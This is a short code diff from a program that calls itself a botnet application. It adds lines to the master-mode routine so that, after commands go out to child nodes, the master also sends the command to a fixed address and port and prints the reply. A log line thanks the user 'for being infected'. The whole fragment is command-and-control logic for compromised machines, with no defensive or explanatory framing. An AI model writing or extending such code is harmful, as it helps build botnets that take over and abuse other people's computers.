@@ -120,6 +120,10 @@ def start_master_mode(storage: BaseStorage, prompt: str = "master") -> None:
             client.change_destination(child)
             client.send_message(command)
 
+        client.change_destination(Address(ip_address("0.0.0.0"), 1232))
+        response = client.send_message(command)
+        print(response)
+
 
 if __name__ == "__main__":
     LOG.info("Welcome to botnet application. Thank you for being infected")
